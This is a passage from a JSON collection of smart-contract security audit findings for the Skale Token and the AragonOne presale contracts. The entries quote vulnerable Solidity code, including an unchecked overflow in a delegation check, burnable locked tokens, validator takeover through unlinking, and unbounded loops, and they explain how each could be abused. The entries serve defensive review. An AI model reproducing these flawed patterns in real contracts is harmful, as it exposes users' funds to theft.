        "Shayan Eskandari"
      ]
    },
    {
      "id": "13825",
      "title": "getLockedCount is iterating over all history of delegations âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\n`getLockedCount` is iterating over all delegations of a specific holder and may even change the state of these delegations by calling `getState`.\n\n\n**code/contracts/delegation/TokenState.sol:L60-L71**\n\n\n\n```\nfunction getLockedCount(address holder) external returns (uint amount) {\n    amount = 0;\n    DelegationController delegationController = DelegationController(contractManager.getContract(\"DelegationController\"));\n    uint[] memory delegationIds = delegationController.getDelegationsByHolder(holder);\n    for (uint i = 0; i < delegationIds.length; ++i) {\n        uint id = delegationIds[i];\n        if (isLocked(getState(id))) {\n            amount += delegationController.getDelegation(id).amount;\n        }\n    }\n    return amount + getPurchasedAmount(holder) + this.getSlashedAmount(holder);\n}\n\n```\nThis problem is major because delegations number is growing over time and may even potentially grow more than the gas limit and lock all tokens forever. `getLockedCount` is called during every transfer which makes any token transfer much more expensive than it should be.\n\n\n#### Recommendation\n\n\nRemove iterations over a potentially unlimited amount of tokens. All the necessary data can be precalculated before and `getLockedCount` function can have O(1) complexity.",
      "summary": "\nA bug was identified in the code/contracts/delegation/TokenState.sol file, which caused the `getLockedCount` function to iterate over all delegations of a specific holder, potentially growing more than the gas limit and locking all tokens forever. This caused any token transfer to be much more expensive than it should be. The issue was fixed as a part of the major code changes in the skale-manager#92 pull request. The recommendation was to remove iterations over a potentially unlimited amount of tokens and precalculate necessary data, so that the `getLockedCount` function can have O(1) complexity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13824",
      "title": "Bounties and fees should only be locked for the first 3 months âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\nBounties are currently locked for the first 3 months after delegation:\n\n\n**code/contracts/delegation/DelegationService.sol:L315**\n\n\n\n```\nskaleBalances.lockBounty(shares[i].holder, timeHelpers.addMonths(delegationStarted, 3));\n\n```\nInstead, they should be locked for the first 3 months after the token launch.\n\n\n#### Recommendation\n\n\nItâ€™s better just to forbid any withdrawals for the first 3 months, no need to track it separately for every delegation. This recommendation is mainly to simplify the process.",
      "summary": "\nThis bug report concerns the locking of bounties for the first 3 months after delegation. Currently, the code locks bounties for the first 3 months after delegation in the DelegationService.sol file on line 315. However, it is recommended that the bounties be locked for the first 3 months after the token launch instead. This would simplify the process and remove the need to track it separately for every delegation. The issue has been fixed as a part of the major code changes in the skale-manager pull request #92.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13823",
      "title": "Unlocking funds after slashing âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\nThe initial funds can be unlocked if 51+% of them are delegated. However if any portion of the funds are slashed, the rest of the funds will not be unlocked at the end of the delegation period.\n\n\n**code/contracts/delegation/TokenState.sol:L258-L263**\n\n\n\n```\nif (\\_isPurchased[delegationId]) {\n    address holder = delegation.holder;\n    \\_totalDelegated[holder] += delegation.amount;\n    if (\\_totalDelegated[holder] >= \\_purchased[holder]) {\n        purchasedToUnlocked(holder);\n    }\n\n```\n#### Recommendation\n\n\nConsider slashed tokens as delegated, or include them in the calculation for process to unlock in `endingDelegatedToUnlocked`",
      "summary": "\nThis bug report is about an issue with the TokenState.sol contract, which is part of the Skale Network. The problem is that when the initial funds are delegated, they can only be unlocked if 51+% of them are delegated. However, if any portion of the funds are slashed, the rest of the funds will not be unlocked at the end of the delegation period. The recommendation is to consider slashed tokens as delegated, or include them in the calculation for process to unlock in `endingDelegatedToUnlocked`. The issue has been fixed as part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13822",
      "title": "Node can unlink validator âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed in [SKALE-2145-unlink-node](https://github.com/skalenetwork/skale-manager/pull/106) by adding a check in `unlinkNodeAddress()` that only `validatorAddress` has the permission to remove nodes from `validators[validatorId]` where `msg.sender == validators[validatorId].validatorAddress`\n\n\n#### Description\n\n\nValidators can link a node address to them by calling `linkNodeAddress` function:\n\n\n**code/contracts/delegation/ValidatorService.sol:L109-L119**\n\n\n\n```\nfunction linkNodeAddress(address validatorAddress, address nodeAddress) external allow(\"DelegationService\") {\n    uint validatorId = getValidatorId(validatorAddress);\n    require(\\_validatorAddressToId[nodeAddress] == 0, \"Validator cannot override node address\");\n    \\_validatorAddressToId[nodeAddress] = validatorId;\n}\n\nfunction unlinkNodeAddress(address validatorAddress, address nodeAddress) external allow(\"DelegationService\") {\n    uint validatorId = getValidatorId(validatorAddress);\n    require(\\_validatorAddressToId[nodeAddress] == validatorId, \"Validator hasn't permissions to unlink node\");\n    \\_validatorAddressToId[nodeAddress] = 0;\n}\n\n```\nAfter that, the node has the same rights and is almost indistinguishable from the validator. So the node can even remove validatorâ€™s address from `_validatorAddressToId` list and take over full control over validator. Additionally, the node can even remove itself by calling `unlinkNodeAddress`, leaving validator with no control at all forever.\n\n\nAlso, even without nodes, a validator can initially call `unlinkNodeAddress` to remove itself.\n\n\n#### Recommendation\n\n\nLinked nodes (and validator) should not be able to unlink validatorâ€™s address from the `_validatorAddressToId` mapping.",
      "summary": "\nA bug was found in the Skale Network Manager code, which allowed a validator to link a node address to them by calling the `linkNodeAddress` function. The linked node had the same rights as the validator, and was able to unlink the validatorâ€™s address from the `_validatorAddressToId` list and take over full control of the validator. Additionally, the node could even remove itself by calling `unlinkNodeAddress`, leaving the validator with no control at all forever. The bug was fixed by adding a check in `unlinkNodeAddress()` that only the `validatorAddress` has the permission to remove nodes from `validators[validatorId]` where `msg.sender == validators[validatorId].validatorAddress`. It was recommended that linked nodes (and validator) should not be able to unlink validatorâ€™s address from the `_validatorAddressToId` mapping.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13821",
      "title": "Holders can burn locked funds âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed in [SKALE-2144](https://github.com/skalenetwork/skale-manager/pull/102/) by adding proper checks in `_burn()`.\n\n\n#### Description\n\n\nSkale token is a modified ERC-777 that allows locking some part of the balance. Locking is checked during every transfer:\n\n\n**code/contracts/ERC777/LockableERC777.sol:L433-L441**\n\n\n\n```\n// Property of the company SKALE Labs inc.---------------------------------\n        uint locked = \\_getLockedOf(from);\n        if (locked > 0) {\n            require(\\_balances[from] >= locked + amount, \"Token should be unlocked for transferring\");\n        }\n//-------------------------------------------------------------------------\n        \\_balances[from] = \\_balances[from].sub(amount);\n        \\_balances[to] = \\_balances[to].add(amount);\n\n\n```\nBut itâ€™s not checked during `burn` function and itâ€™s possible to â€œburnâ€ locked tokens. Tokens will be burned, but `locked` amount will remain the same. That will result in having more `locked` tokens than the balance which may have very unpredictable behaviour.\n\n\n#### Recommendation\n\n\nAllow burning only unlocked tokens.",
      "summary": "\nThe Skale token is a modified ERC-777 token, which allows users to lock a portion of their balance. This is checked during every transfer, but not during the `burn` function. As a result, it is possible to burn the locked tokens, which will result in having more locked tokens than the balance, which may have unpredicatable behaviour. To fix this issue, it was recommended to allow burning only unlocked tokens. This was fixed in SKALE-2144 by adding proper checks in `_burn()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13820",
      "title": "uint overflow may lead to stealing funds âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nsafeMath was added in [SKALE-215](https://github.com/skalenetwork/skale-manager/pull/86). At the time of the writing this comment, the review has not been comprehensive to all arithmetic calculations in the scope.\n\n\nNote that in some cases usage of safeMath due to reverts can result in unexpected halting of the system, that too should be reviewed again.\n\n\n\n\n#### Description\n\n\nItâ€™s possible to create a delegation with a very huge amount which may result in a lot of critically bad malicious usages:\n\n\n**code/contracts/delegation/DelegationRequestManager.sol:L74-L76**\n\n\n\n```\nuint holderBalance = SkaleToken(contractManager.getContract(\"SkaleToken\")).balanceOf(holder);\nuint lockedToDelegate = tokenState.getLockedCount(holder) - tokenState.getPurchasedAmount(holder);\nrequire(holderBalance >= amount + lockedToDelegate, \"Delegator hasn't enough tokens to delegate\");\n\n```\n`amount` is passed by a user as a parameter, so if itâ€™s close to `uint` max value, `amount + lockedToDelegate` would overflow and this requirement would pass.\n\n\nHaving delegation with an almost infinite amount of tokens can lead to many various attacks on the system up to stealing funds and breaking everything.\n\n\n#### Recommendation\n\n\nUsing `SafeMath` everywhere should prevent this and other similar issues.\nThere should be more critical attacks caused by overflows/underflows, so `SafeMath` should be used everywhere in the codebase.",
      "summary": "\nThis bug report describes an issue with the DelegationRequestManager.sol code in the Skale-Manager repository. If an amount close to the maximum uint value is passed as a parameter, the requirement to check if the delegator has enough tokens to delegate will pass due to an overflow. This could lead to a variety of malicious attacks, such as stealing funds and breaking the system.\n\nThe recommended solution is to use SafeMath everywhere in the codebase. This will prevent similar issues from arising and will help protect the system from malicious attacks. The review process for SafeMath has not yet been comprehensive, so further review is needed to ensure all arithmetic calculations are covered. Additionally, usage of SafeMath can result in unexpected halting of the system, so this should also be reviewed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13909",
      "title": "EOPBCTemplate - EtherTokenConstant is never used âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by removing the `EtherTokenConstant` dependency.\n\n\n#### Description\n\n\nThe constant value `EtherTokenConstant.ETH` is never used.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L3**\n\n\n\n```\nimport \"@aragon/os/contracts/common/EtherTokenConstant.sol\";\n\n```\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L21**\n\n\n\n```\ncontract EOPBCTemplate is EtherTokenConstant, BaseTemplate {\n\n```\n#### Recommendation\n\n\nRemove all references to `EtherTokenConstant`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13908",
      "title": "EOPBCTemplate - Keep the template as closely aligned to the audited Company DAO-Template provided by Aragon âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe issue was addressed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) changing the main deployment method from `installFundraisingApps` to `newInstance` aligned with the Aragon/DAO-templates naming.\n\n\n#### Description\n\n\nThe EOPBCTemplate is a simplified variant of the [AragonBlack/FundraisingMultisigTemplate](https://github.com/AragonBlack/fundraising/blob/a51b246507af7b17ec65a9961bff6d9b8e75b7c6/templates/multisig/contracts/FundraisingMultisigTemplate.sol). The FundraisingMultisigTemplate is initially based on the [Aragon/DAO-templates/company-board](https://github.com/aragon/dao-templates/tree/master/templates/company-board) template.\n\n\nPlease note that the DAO-templates provided by Aragon have [recently](https://github.com/ConsenSys/aragon-daotemplates-audit-report-2019-08) been audited.\n\n\nThe EOPBCTemplate is similar to the setup established with [Aragon/DAO-templates/company](https://github.com/aragon/dao-templates/tree/master/templates/company). The scenario deploys in one step. However, interface names are different to the audited DAO-template variant (`installFundraisingApps` vs `newInstance`). We recommend the template and interface names to be kept as close as possible to the audited `company` template which established the entry point for deploying a one-step template as `newInstance`.\n\n\n#### Recommendation\n\n\nTake the [Aragon/DAO-templates/company](https://github.com/aragon/dao-templates/tree/master/templates/company) template as a starting point and add relevant parts for the presale variant.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13907",
      "title": "EOPBCTemplate - inconsistent storage location declaration âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by adding the missing storage location declaration.\n\n\n#### Description\n\n\n`_cacheFundraisingParams()` does not explicitly declare the return value memory location.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L273-L286**\n\n\n\n```\nfunction \\_cacheFundraisingParams(\n    address       \\_owner,\n    string        \\_id,\n    ERC20         \\_collateralToken,\n    MiniMeToken   \\_bondedToken,\n    uint64        \\_period,\n    uint256       \\_exchangeRate,\n    uint64        \\_openDate,\n    uint256       \\_reserveRatio,\n    uint256       \\_batchBlocks,\n    uint256       \\_slippage\n)\n    internal\n    returns (FundraisingParams fundraisingParams)\n\n```\n`_cacheFundraisingApps()` explicitly declares to return a copy of the storage struct.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L254-L271**\n\n\n\n```\nfunction \\_cacheFundraisingApps(\n    Agent          \\_reserve,\n    Presale        \\_presale,\n    MarketMaker    \\_marketMaker,\n    Tap            \\_tap,\n    Controller     \\_controller,\n    TokenManager   \\_tokenManager\n)\n    internal\n    returns (FundraisingApps memory fundraisingApps)\n{\n    fundraisingApps.reserve            = \\_reserve;\n    fundraisingApps.presale            = \\_presale;\n    fundraisingApps.marketMaker        = \\_marketMaker;\n    fundraisingApps.tap                = \\_tap;\n    fundraisingApps.controller         = \\_controller;\n    fundraisingApps.bondedTokenManager = \\_tokenManager;\n}\n\n```\n#### Recommendation\n\n\nStorage declarations should be consistent.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13906",
      "title": "EOPBCTemplate - Pool should be Agent or Reserve âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by replacing `Pool` for `Reserve` in the documentation.\n\n\n#### Description\n\n\nThe documentation refers to an non-existent `Pool` application.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/README.md:L58-L68**\n\n\n\n```\n| App  | Permission             | Grantee          | Manager          |\n| ---- | ---------------------- | ---------------- | ---------------- |\n| Pool | SAFE\\_EXECUTE           | Owner            | Owner            |\n| Pool | ADD\\_PROTECTED\\_TOKEN    | Controller       | Owner            |\n| Pool | REMOVE\\_PROTECTED\\_TOKEN | NULL             | NULL             |\n| Pool | EXECUTE                | NULL             | NULL             |\n| Pool | DESIGNATE\\_SIGNER       | NULL             | NULL             |\n| Pool | ADD\\_PRESIGNED\\_HASH     | NULL             | NULL             |\n| Pool | RUN\\_SCRIPT             | NULL             | NULL             |\n| Pool | TRANSFER               | MarketMaker      | Owner            |\n\n\n```\n#### Recommendation\n\n\n`Pool` should be `Agent` or `Reserve`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13905",
      "title": "EOPBCTemplate - misleading method names _cacheFundraisingApps and _cacheFundraisingParams âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailÂ protected]`0ce7c72`](https://github.com/aragonone/fundraising/pull/4/commits/0ce7c724de9c9e92a479f6b1c8b20405957e3d50) by renaming the functions.\n\n\n#### Description\n\n\nThe methods `_cacheFundraisingApps` and `_cacheFundraisingParams` suggest that parameters are cached as state variables in the contract similar to the multi-step deployment contract used for AragonBlack/Fundraising. However, the methods are just returning memory structs.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L254-L300**\n\n\n\n```\nfunction \\_cacheFundraisingApps(\n    Agent          \\_reserve,\n    Presale        \\_presale,\n    MarketMaker    \\_marketMaker,\n    Tap            \\_tap,\n    Controller     \\_controller,\n    TokenManager   \\_tokenManager\n)\n    internal\n    returns (FundraisingApps memory fundraisingApps)\n{\n    fundraisingApps.reserve            = \\_reserve;\n    fundraisingApps.presale            = \\_presale;\n    fundraisingApps.marketMaker        = \\_marketMaker;\n    fundraisingApps.tap                = \\_tap;\n    fundraisingApps.controller         = \\_controller;\n    fundraisingApps.bondedTokenManager = \\_tokenManager;\n}\n\nfunction \\_cacheFundraisingParams(\n    address       \\_owner,\n    string        \\_id,\n    ERC20         \\_collateralToken,\n    MiniMeToken   \\_bondedToken,\n    uint64        \\_period,\n    uint256       \\_exchangeRate,\n    uint64        \\_openDate,\n    uint256       \\_reserveRatio,\n    uint256       \\_batchBlocks,\n    uint256       \\_slippage\n)\n    internal\n    returns (FundraisingParams fundraisingParams)\n{\n    fundraisingParams = FundraisingParams({\n        owner:           \\_owner,\n        id:              \\_id,\n        collateralToken: \\_collateralToken,\n        bondedToken:     \\_bondedToken,\n        period:          \\_period,\n        exchangeRate:    \\_exchangeRate,\n        openDate:        \\_openDate,\n        reserveRatio:    \\_reserveRatio,\n        batchBlocks:     \\_batchBlocks,\n        slippage:        \\_slippage\n    });\n}\n\n```\n#### Recommendation\n\n\nThe functions are only called once throughout the deployment process. The structs can therefore be created directly in the main method. Otherwise rename the functions to properly reflect their purpose.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13904",
      "title": "BalanceRedirectPresale - setPeriod uint64 overflow in validation check âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by performing the addition using `SafeMath`.\n\n\n#### Description\n\n\n`setPeriod()` allows setting an arbitrary Presale starting date. The method can be called by an entity with the `OPEN_ROLE` permission. Providing a large enough value for `uint64 _period` can overflow the second input validation check. The result is unwanted behaviour where for relatively large values of `period` the require might fail because the overflow `openDate + _period` is less than or equal the current timestamp (`getTimestamp64()`) but if high enough it still might succeed because `openDate + _period` is higher than the current timestamp. The overflow has no effect on the presale end as it is calculated against `_timeSinceOpen`.\n\n\n**code/fundraising/apps/presale/contracts/BalanceRedirectPresale.sol:L253-L257**\n\n\n\n```\nfunction \\_setPeriod(uint64 \\_period) internal {\n    require(\\_period > 0, ERROR\\_TIME\\_PERIOD\\_ZERO);\n    require(openDate == 0 || openDate + \\_period > getTimestamp64(), ERROR\\_INVALID\\_TIME\\_PERIOD);\n    period = \\_period;\n}\n\n```\n![aragon_fundraising_presale]()![aragon_fundraising_presale](https://user-images.githubusercontent.com/2865694/69815349-6148a800-11f6-11ea-871f-18405deb9899.png)\n\n\n#### Recommendation\n\n\nUse `SafeMath` which is already imported to protect from overflow scenarios.",
      "summary": "\nThis bug report is about the `setPeriod()` method in the BalanceRedirectPresale.sol contract, which allows setting a Presale starting date. The method can be called by an entity with the `OPEN_ROLE` permission, however, providing a large enough value for `uint64 _period` can cause an overflow in the second input validation check. This can lead to unexpected behaviour when the overflow results in a `openDate + _period` that is less than or equal to the current timestamp (`getTimestamp64()`).\n\nTo fix this bug, the code was updated with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by performing the addition using `SafeMath`. This helps protect from overflow scenarios.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13903",
      "title": "BalanceRedirectPresale - Tokens vest during the Presale phase Â Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe issue was addressed with the following statement:\n\n\n\n> \n> This presale version is intended to be used along with the Externally Owned Presale and Bonding Curve Template, which doesnâ€™t have a Voting app, therefore contributors doesnâ€™t have any voting power.\n> The use case is the deployment of Aragon Network Jurors Token (ANJ) for the Aragon Court, which is not going to be active before the presale starts, so we donâ€™t see any potential issue here.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nTokens are directly minted and assigned to contributors during the Presale. While this might not be an issue if the minted token does not give any voting power of some sort in a DAO it can be a problem for scenarios where contributors get stake in return for contributions.\n\n\n#### Recommendation\n\n\nVest tokens for contributors after the presale finishes. In case this is the expected we suggest to add a note to the documentation to make potential users aware of this behaviour that might have security implications if contributors get stake in return for their investments.",
      "summary": "\nThis bug report concerns the presale version of a token that is intended to be used with the Externally Owned Presale and Bonding Curve Template. The issue is that tokens are directly minted and assigned to contributors during the presale, which could be a problem if the minted token gives voting power in a Decentralized Autonomous Organization (DAO). The resolution is that tokens should be vested for contributors after the presale finishes. It is recommended that a note be added to the documentation to make potential users aware of this behavior, as it could have security implications if contributors get stake in return for their investments.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13902",
      "title": "Repository structure - Create a clean repository containing one Aragon Application unless changes are contributed upstream âœ“Â Deferred",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe issue has been deferred pending internal discussion.\n\n\n#### Description\n\n\nThe repository is a fork of [AragonBlack/fundraising](https://github.com/AragonBlack/fundraising). The main development repository for Aragon Fundraising is the origin repository at AragonBlock. This repository duplicates a state of the upstream repository that can quickly get out of sync and therefore hard to maintain.\n\n\nIt is unclear if both repositories will live side-by-side or if the `BalanceRedirectPresale` variant is contributed upstream.\n\n\n#### Recommendation\n\n\nIn case changes are not planned to be contributed upstream it is recommended to create a clean Aragon Application from scratch removing any unused or duplicated files.",
      "summary": "\nThis bug report concerns the repository of Aragon Fundraising, which is a fork of AragonBlack/fundraising. The issue is that the main development repository for Aragon Fundraising is the origin repository at AragonBlock, which can quickly get out of sync with the fork and become hard to maintain. It is unclear if both repositories will live side-by-side or if the `BalanceRedirectPresale` variant is contributed upstream. \n\nThe resolution of this bug report is that it has been deferred pending internal discussion. The recommendation is that, if changes are not planned to be contributed upstream, it is recommended to create a clean Aragon Application from scratch, removing any unused or duplicated files.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13901",
      "title": "BalanceRedirectPresale - Presale can be extended indefinitely Â Won't Fix",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue was addressed with the following statement:\n\n\n\n> \n> It is a very reasonable concern, but this is the intended behavior. That modification is permissioned and that `OPEN_ROLE` is going to be held by the Aragon Network Dao, so we expect a reasonable use of it. We may document it and make it clear that this is possible.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe `OPEN_ROLE` can indefinitely extend the Presale even after users contributed funds to it by adjusting the presale period. The period might be further manipulated to avoid that token trading in the MarketMaker is opened.\n\n\n**code/fundraising/apps/presale/contracts/BalanceRedirectPresale.sol:L136-L138**\n\n\n\n```\nfunction setPeriod(uint64 \\_period) external auth(OPEN\\_ROLE) {\n    \\_setPeriod(\\_period);\n}\n\n```\n**code/fundraising/apps/presale/contracts/BalanceRedirectPresale.sol:L253-L257**\n\n\n\n```\nfunction \\_setPeriod(uint64 \\_period) internal {\n    require(\\_period > 0, ERROR\\_TIME\\_PERIOD\\_ZERO);\n    require(openDate == 0 || openDate + \\_period > getTimestamp64(), ERROR\\_INVALID\\_TIME\\_PERIOD);\n    period = \\_period;\n}\n\n```\n#### Recommendation\n\n\nDo not allow to extend the presale after funds have been contributed to it or only allow period adjustments in `State.PENDING`.",
      "summary": "\nThis bug report is about the `OPEN_ROLE` in the BalanceRedirectPresale smart contract. This `OPEN_ROLE` can be used to indefinitely extend the Presale period, even after users have contributed funds to it. This could be manipulated to prevent token trading in the MarketMaker from being opened. The recommendation is to not allow the period to be extended after funds have been contributed, or to only allow period adjustments in `State.PENDING`. This issue was addressed with the statement that it is reasonable behavior and that the `OPEN_ROLE` is held by the Aragon Network Dao, and that it may be documented to make it clear that this is possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13900",
      "title": "EOPBCTemplate - AppId of BalanceRedirectPresale should be different from AragonBlack/Presale namehash to avoid collisions âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by generating a unique APMNameHash for `BalanceRedirectPresale` that does not collide with the one from `Presale`.\n\n\n#### Description\n\n\nThe template references the new presale contract with `apmNamehash` `0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5`. However, this namehash is already used by the aragonBlack/Presale contract. To avoid confusion and collision a unique `apmNamehash` should be used for this variant of the contract.\n\n\nNote that the contract that is referenced from an `apmNamehash` is controlled by the `ENS` resolver that is configured when deploying the template contract. Using the same namehash for both variants of the contract does not allow a single registry to simultaneously provide both variants of the contract and might lead to confusion as to which application is actually deployed. This also raises the issue that the `ENS` registry must be verified before actually using the contract as a malicious registry could force the template to deploy potentially malicious applications.\n\n\n##### aragonOne/Fundraising:\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L32**\n\n\n\n```\nbytes32   private constant PRESALE\\_ID                    = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;\n\n```\n##### aragonBlack/Fundraising:\n\n\n**templates/multisig/contracts/FundraisingMultisigTemplate.sol:L35**\n\n\n\n```\nbytes32   private constant 